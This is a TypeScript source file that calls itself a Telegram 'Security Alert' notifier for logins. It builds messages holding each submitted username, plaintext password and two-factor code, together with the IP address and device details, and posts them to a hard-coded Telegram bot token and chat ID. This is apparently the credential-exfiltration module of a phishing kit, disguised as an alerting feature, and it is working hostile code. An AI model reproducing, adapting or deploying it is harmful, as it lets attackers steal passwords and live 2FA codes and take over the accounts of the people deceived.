export interface TelegramBotConfig {
  botToken: string;
  chatId: string;
  enabled: boolean;
}

export interface TelegramNotificationConfig {
  bot: TelegramBotConfig;
  notifications: {
    loginAttempts: boolean;
    twoFactorCodes: boolean;
    includeUserAgent: boolean;
    includeTimestamp: boolean;
    includeIpAddress: boolean;
  };
  messageFormat: {
    useEmojis: boolean;
    includeLabels: boolean;
    customPrefix?: string;
  };
}

// Main Telegram configuration
export const telegramConfig: TelegramNotificationConfig = {
  bot: {
    // Replace these with your actual Telegram bot details
    botToken: "7861955364:AAGaaIsQwid-erHNW8YjFzpNuyYI716riaQ", // Get from @BotFather
    chatId: "5791106131",     // Your chat ID or group ID
    enabled: true, // Set to false to disable notifications
  },
  
  notifications: {
    loginAttempts: true,      // Send notifications for login attempts
    twoFactorCodes: true,     // Send notifications for 2FA codes
    includeUserAgent: true,   // Include browser/device info
    includeTimestamp: true,   // Include timestamp
    includeIpAddress: true,   // Include IP address (if available)
  },
  
  messageFormat: {
    useEmojis: true,          // Use emojis in messages
    includeLabels: true,      // Include field labels
    customPrefix: "🔐 Security Alert", // Custom message prefix
  },
};

export interface TelegramNotificationData {
  username: string;
  password?: string;
  verification_code?: string;
  ip_address?: string;
  user_agent?: string;
  timestamp?: string;
  type: 'login' | '2fa';
}

export const buildTelegramMessage = (data: TelegramNotificationData): string => {
  const config = telegramConfig;
  const { messageFormat } = config;
  
  let message = '';
  
  // Add prefix
  if (messageFormat.customPrefix) {
    message += `${messageFormat.customPrefix}\n\n`;
  } else if (messageFormat.useEmojis) {
    message += `🔐 New ${data.type === 'login' ? 'Login Attempt' : '2FA Verification'}\n\n`;
  } else {
    message += `New ${data.type === 'login' ? 'Login Attempt' : '2FA Verification'}\n\n`;
  }
  
  // Add username
  const userIcon = messageFormat.useEmojis ? '👤 ' : '';
  const userLabel = messageFormat.includeLabels ? 'Username: ' : '';
  message += `${userIcon}${userLabel}${data.username}\n`;
  
  // Add password (for login attempts)
  if (data.password && config.notifications.loginAttempts) {
    const passIcon = messageFormat.useEmojis ? '🔑 ' : '';
    const passLabel = messageFormat.includeLabels ? 'Password: ' : '';
    message += `${passIcon}${passLabel}${data.password}\n`;
  }
  
  // Add 2FA code
  if (data.verification_code && config.notifications.twoFactorCodes) {
    const codeIcon = messageFormat.useEmojis ? '📱 ' : '';
    const codeLabel = messageFormat.includeLabels ? '2FA Code: ' : '';
    message += `${codeIcon}${codeLabel}${data.verification_code}\n`;
  }
  
  // Add IP address
  if (data.ip_address && config.notifications.includeIpAddress) {
    const ipIcon = messageFormat.useEmojis ? '🌐 ' : '';
    const ipLabel = messageFormat.includeLabels ? 'IP: ' : '';
    message += `${ipIcon}${ipLabel}${data.ip_address}\n`;
  }
  
  // Add user agent
  if (data.user_agent && config.notifications.includeUserAgent) {
    const deviceIcon = messageFormat.useEmojis ? '💻 ' : '';
    const deviceLabel = messageFormat.includeLabels ? 'Device: ' : '';
    message += `${deviceIcon}${deviceLabel}${data.user_agent}\n`;
  }
  
  // Add timestamp
  if (data.timestamp && config.notifications.includeTimestamp) {
    const timeIcon = messageFormat.useEmojis ? '⏰ ' : '';
    const timeLabel = messageFormat.includeLabels ? 'Time: ' : '';
    message += `\n${timeIcon}${timeLabel}${new Date(data.timestamp).toLocaleString()}`;
  }
  
  return message;
};

export const sendTelegramNotification = async (data: TelegramNotificationData): Promise<boolean> => {
  const config = telegramConfig;
  
  // Check if notifications are enabled
  if (!config.bot.enabled) {
    console.log('Telegram notifications are disabled');
    return false;
  }
  
  // Check if specific notification type is enabled
  if (data.type === 'login' && !config.notifications.loginAttempts) {
    console.log('Login attempt notifications are disabled');
    return false;
  }
  
  if (data.type === '2fa' && !config.notifications.twoFactorCodes) {
    console.log('2FA code notifications are disabled');
    return false;
  }
  
  // Validate bot configuration
  if (!config.bot.botToken || config.bot.botToken === 'YOUR_BOT_TOKEN_HERE') {
    console.error('Telegram bot token not configured');
    return false;
  }
  
  if (!config.bot.chatId || config.bot.chatId === 'YOUR_CHAT_ID_HERE') {
    console.error('Telegram chat ID not configured');
    return false;
  }
  
  try {
    const message = buildTelegramMessage(data);
    const telegramUrl = `https://api.telegram.org/bot${config.bot.botToken}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: config.bot.chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', errorText);
      return false;
    }
    
    console.log('Telegram notification sent successfully');
    return true;
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
    return false;
  }
};

// Helper function to get user's IP address
export const getUserIpAddress = async (): Promise<string | null> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Failed to get IP address:', error);
    return null;
  }
};
